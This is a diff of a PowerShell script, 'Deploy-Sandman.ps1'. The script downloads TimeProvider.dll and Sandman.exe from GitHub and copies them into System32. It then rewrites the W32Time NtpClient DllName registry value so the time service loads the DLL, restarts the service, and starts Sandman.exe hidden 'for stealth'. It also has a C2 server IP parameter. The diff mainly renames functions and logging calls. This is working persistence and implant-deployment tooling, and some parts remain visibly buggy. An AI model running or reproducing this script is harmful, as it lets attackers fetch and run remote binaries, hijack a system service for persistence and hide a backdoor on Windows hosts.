@@ -5,8 +5,6 @@
     Downloads binaries from GitHub, moves to System32, registers DLL,
     restarts W32Time, and runs Sandman.exe
 .NOTES
-    Author: Sandman Team
-    Version: 2.0.0
     Platform: Windows (PowerShell 5.1+)
 #>
 
@@ -20,14 +18,14 @@ param(
     [Parameter(Mandatory = $false)]
     [string]$C2ServerIP = "10.10.10.50",
 
-    [Parameter(Mandatory = $false)]
+        [Parameter(Mandatory = $false)]
     [switch]$ShowVerbose,
 
     [Parameter(Mandatory = $false)]
     [switch]$QuietMode
 )
 
-function :Log-Info{
+function Log-Info{
     param($Message)
     
     if ($ShowVerbose -or $Verbose -ne "INFO") {
@@ -46,16 +44,16 @@ function :Log-Info{
 }
 
 
-function :Check-Admin{
+function Check-Admin{
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
-        Log "Script requires Administrator privileges" -Level "ERROR"
+        Log-Info "Script requires Administrator privileges" -Level "ERROR"
         Write-Host "Please run PowerShell as Administrator"
         return $false
     }
     return $true
 }
 
-function :Download-Binaries{
+function Download-Binaries{
     param($GithubRepo, $OutputPath)
     
     $TimeProviderUrl = Join-Path $GithubRepo "TimeProvider.dll"
@@ -70,99 +68,99 @@ function :Download-Binaries{
     }
     
     # Download TimeProvider.dll
-    Log "Downloading TimeProvider.dll..."
+    Log-Info "Downloading TimeProvider.dll..."
     try {
         Invoke-WebRequest -Uri $TimeProviderUrl -OutFile $TimeProviderPath -TimeoutSec 60
-        Log "Downloaded: $TimeProviderPath"
+        Log-Info "Downloaded: $TimeProviderPath"
     } catch {
-        Log "Download failed: $_" -Level "WARN"
+        Log-Info "Download failed: $_" -Level "WARN"
     }
     
     # Download Sandman.exe
-    Log "Downloading Sandman.exe..."
+    Log-Info "Downloading Sandman.exe..."
     try {
         Invoke-WebRequest -Uri $SandmanUrl -OutFile $SandmanPath -TimeoutSec 60
-        Log "Downloaded: $SandmanPath"
+        Log-Info "Downloaded: $SandmanPath"
     } catch {
-        Log "Download failed: $_" -Level "WARN"
+        Log-Info "Download failed: $_" -Level "WARN"
     }
     
     return $true
 }
 
-function :Move-To-System32{
+function Move-To-System32{
     param($SourcePath, $DestinationPath, $FileName)
     
     $Destination = Join-Path $DestinationPath $FileName
     if (Test-Path $Destination) {
-        Log "Backup: $Destination"
+        Log-Info "Backup: $Destination"
         $BackupPath = Join-Path $DestinationPath "$FileName.bak"
         Rename-Item -Path $Destination -NewName $BackupPath -Force
     }
     
     Move-Item -Path $SourcePath -Destination $Destination -Force
-    Log "Moved: $FileName to $Destination"
+    Log-Info "Moved: $FileName to $Destination"
 }
 
-function :Register-Dll{
+function Register-Dll{
     param($DllPath, $RegistryPath)
     
     # 1. Backup existing DllName
     $RegistryPath = Join-Path $RegistryPath "DllName"
     $BackupValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
     if ($BackupValue) {
-        Log "Backup: $RegistryPath = $($BackupValue.DllName)"
+        Log-Info "Backup: $RegistryPath = $($BackupValue.DllName)"
     }
     
     # 2. Set new DllName
-    Log "Setting DllName to: $DllPath"
+    Log-Info "Setting DllName to: $DllPath"
     try {
         $null = reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" `
                       /v DllName /t REG_SZ /d "$DllPath" /f
-        Log "Registry updated successfully"
+        Log-Info "Registry updated successfully"
     } catch {
-        Log "Registry error: $_" -Level "ERROR"
+        Log-Info "Registry error: $_" -Level "ERROR"
     }
     
     # 3. Verify registry change
     $NewValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
     if ($NewValue -and $NewValue.DllName -eq $DllPath) {
-        Log "Registry verified successfully" -Level "OK"
+        Log-Info "Registry verified successfully" -Level "OK"
     } else {
-        Log "Registry verification failed" -Level "WARN"
+        Log-Info "Registry verification failed" -Level "WARN"
     }
 }
 
-function :Restart-W32TimeService{
+function Restart-W32TimeService{
     param($ServiceName, $RestartCommand)
     
-    Log "Restarting $ServiceName service..."
+    Log-Info "Restarting $ServiceName service..."
     try {
         $null = & sc stop $ServiceName -Timeout 30
-        Log "Service stopped"
+        Log-Info "Service stopped"
         
         $null = & sc start $ServiceName
-        Log "Service started"
+        Log-Info "Service started"
         
         $Service = Get-Service -Name $ServiceName
         if ($Service.Status -eq "Running") {
-            Log "Service is now running" -Level "OK"
+            Log-Info "Service is now running" -Level "OK"
             return $true
         } else {
-            Log "Service status: $($Service.Status)" -Level "WARN"
+            Log-Info "Service status: $($Service.Status)" -Level "WARN"
             return $true
         }
     } catch {
-        Log "Service restart error: $_" -Level "ERROR"
+        Log-Info "Service restart error: $_" -Level "ERROR"
         return $false
     }
 }
 
-function :Run-Sandman{
+function Run-Sandman{
     param($Executable, $Args)
     
     try {
-        Log "Starting $Executable..."
+        Log-Info "Starting $Executable..."
         
         # Create hidden process for stealth
         $Process = Start-Process -FilePath $Executable `
@@ -171,7 +169,7 @@ function :Run-Sandman{
                                 -PassThru
         
         $ProcessId = $Process.Id
-        Log "Started: $Executable (PID: $ProcessId)"
+        Log-Info "Started: $Executable (PID: $ProcessId)"
         
         # Wait 5 seconds for initial response
         Start-Sleep -Seconds 5
@@ -179,16 +177,16 @@ function :Run-Sandman{
         # Check if process is still running
         $Process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
         if ($Process -and $Process.MainModule) {
-            Log "Process is running: $($Process.MainModule.FileName)" -Level "OK"
+            Log-Info "Process is running: $($Process.MainModule.FileName)" -Level "OK"
         } else {
-            Log "Process may have exited" -Level "WARN"
+            Log-Info "Process may have exited" -Level "WARN"
         }
     } catch {
-        Log "Process start error: $_" -Level "ERROR"
+        Log-Info "Process start error: $_" -Level "ERROR"
     }
 }
 
-function :Print-Banner{
+function Print-Banner{
     Write-Host @"
    _____                 _                       
   / ____|               | |                      
@@ -201,7 +199,7 @@ function :Print-Banner{
     Write-Host "        ============================="
 }
 
-function :Print-Usage{
+function Print-Usage{
     Write-Host @"
 Usage: .\Deploy-Sandman.ps1 [-Verbose] [-Quiet]
 
@@ -214,7 +212,7 @@ Examples:
 }
 
 # === MAIN SCRIPT (Continued) ===
-Log "Starting Sandman Auto Deploy v2.0..."
+Log-Info "Starting Sandman Auto Deploy v2.0..."
 
 # Check Admin
 if (-not (Check-Admin)) {
@@ -224,92 +222,92 @@ if (-not (Check-Admin)) {
 Print-Banner
 
 # Step 1: Download Binaries
-Log "Step 1: Downloading Binaries..."
+Log-Info "Step 1: Downloading Binaries..."
 $TimeProviderPath = Join-Path (Split-Path $GithubRepo) "TimeProvider.dll"
 $SandmanPath = Join-Path (Split-Path $GithubRepo) "Sandman.exe"
 
 $Downloaded = $false
 if (Test-Path $TimeProviderPath) {
     $Downloaded = $true
-    Log "TimeProvider.dll exists: $TimeProviderPath"
+    Log-Info "TimeProvider.dll exists: $TimeProviderPath"
 } else {
-    Log "TimeProvider.dll not found, downloading from GitHub..."
+    Log-Info "TimeProvider.dll not found, downloading from GitHub..."
     $GithubUrl = Join-Path $GithubRepo "TimeProvider.dll"
     $TempPath = Join-Path $env:TEMP "Temp_TimeProvider.dll"
     Invoke-WebRequest -Uri $GithubUrl -OutFile $TempPath -TimeoutSec 60
     Move-Item -Path $TempPath -Destination $TimeProviderPath -Force
-    Log "Downloaded and moved to: $TimeProviderPath"
+    Log-Info "Downloaded and moved to: $TimeProviderPath"
 }
 
 if (Test-Path $SandmanPath) {
     $Downloaded = $true
-    Log "Sandman.exe exists: $SandmanPath"
+    Log-Info "Sandman.exe exists: $SandmanPath"
 } else {
-    Log "Sandman.exe not found, downloading from GitHub..."
+    Log-Info "Sandman.exe not found, downloading from GitHub..."
     $GithubUrl = Join-Path $GithubRepo "Sandman.exe"
     $TempPath = Join-Path $env:TEMP "Temp_Sandman.exe"
     Invoke-WebRequest -Uri $GithubUrl -OutFile $TempPath -TimeoutSec 60
     Move-Item -Path $TempPath -Destination $SandmanPath -Force
-    Log "Downloaded and moved to: $SandmanPath"
+    Log-Info "Downloaded and moved to: $SandmanPath"
 }
 
 if (-not $Downloaded) {
-    Log "Binaries download failed!" -Level "ERROR"
+    Log-Info "Binaries download failed!" -Level "ERROR"
     exit 1
 }
 
 # Step 2: Move to System32
-Log "Step 2: Moving to System32..."
-:Move-To-System32 $TimeProviderPath $TargetSystem32Path "TimeProvider.dll"
-:Move-To-System32 $SandmanPath $TargetSystem32Path "Sandman.exe"
+Log-Info "Step 2: Moving to System32..."
+Move-To-System32 $TimeProviderPath $TargetSystem32Path "TimeProvider.dll"
+Move-To-System32 $SandmanPath $TargetSystem32Path "Sandman.exe"
 
 # Step 3: Register DLL
-Log "Step 3: Registering DLL in W32Time..."
+Log-Info "Step 3: Registering DLL in W32Time..."
 $RegistryPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient"
 $RegistryPath = Join-Path $RegistryPath "DllName"
 
 # Backup existing DllName
 $BackupValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
 if ($BackupValue) {
-    Log "Backup: RegistryPath = $($BackupValue.DllName)"
+    Log-Info "Backup: RegistryPath = $($BackupValue.DllName)"
 }
 
 # Set new DllName
-Log "Setting DllName to: $TimeProviderPath"
+Log-Info "Setting DllName to: $TimeProviderPath"
 try {
     $null = reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" `
                   /v DllName /t REG_SZ /d "$TimeProviderPath" /f
-    Log "Registry updated successfully"
+    Log-Info "Registry updated successfully"
 } catch {
-    Log "Registry error: $_" -Level "ERROR"
+    Log-Info "Registry error: $_" -Level "ERROR"
     exit 1
 }
 
 # Verify registry change
 $NewValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
 if ($NewValue -and $NewValue.DllName -eq $TimeProviderPath) {
-    Log "Registry verified successfully" -Level "OK"
+    Log-Info "Registry verified successfully" -Level "OK"
 } else {
-    Log "Registry verification failed" -Level "WARN"
+    Log-Info "Registry verification failed" -Level "WARN"
 }
 
 # Step 4: Restart W32Time Service
-Log "Step 4: Restarting W32Time Service..."
+Log-Info "Step 4: Restarting W32Time Service..."
 $null = & sc stop "w32time" -Timeout 30
-Log "Service stopped"
+Log-Info "Service stopped"
 
 $null = & sc start "w32time"
-Log "Service started"
+Log-Info "Service started"
 
 $Service = Get-Service -Name "w32time"
 if ($Service.Status -eq "Running") {
-    Log "Service is now running" -Level "OK"
+    Log-Info "Service is now running" -Level "OK"
 } else {
-    Log "Service status: $($Service.Status)" -Level "WARN"
+    Log-Info "Service status: $($Service.Status)" -Level "WARN"
 }
 
 # Step 5: Run Sandman.exe
-Log "Step 5: Running Sandman.exe..."
+Log-Info "Step 5: Running Sandman.exe..."
 $SandmanExecutable = Join-Path $TargetSystem32Path "Sandman.exe"
 
 if (Test-Path $SandmanExecutable) {
@@ -327,7 +325,7 @@ if (Test-Path $SandmanExecutable) {
                             -PassThru
     
     $ProcessId = $Process.Id
-    Log "Started: Sandman.exe (PID: $ProcessId)"
+    Log-Info "Started: Sandman.exe (PID: $ProcessId)"
     
     # Wait 5 seconds for initial response
     Start-Sleep -Seconds 5
@@ -335,16 +333,16 @@ if (Test-Path $SandmanExecutable) {
     # Check if process is still running
     $Process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
     if ($Process -and $Process.MainModule) {
-        Log "Process is running: $($Process.MainModule.FileName)" -Level "OK"
+        Log-Info "Process is running: $($Process.MainModule.FileName)" -Level "OK"
     } else {
-        Log "Process may have exited" -Level "WARN"
+        Log-Info "Process may have exited" -Level "WARN"
     }
 } else {
-    Log "Sandman.exe not found at: $SandmanExecutable" -Level "ERROR"
+    Log-Info "Sandman.exe not found at: $SandmanExecutable" -Level "ERROR"
 }
 
 # Step 6: Print Summary
-Log "Step 6: Deployment Summary..."
+Log-Info "Step 6: Deployment Summary..."
 Write-Host @"
    Deployment Complete!
 
@@ -355,4 +353,4 @@ Write-Host @"
 
 "@
 
-Log "Deployment finished successfully!" -Level "OK"
+Log-Info "Deployment finished successfully!" -Level "OK"
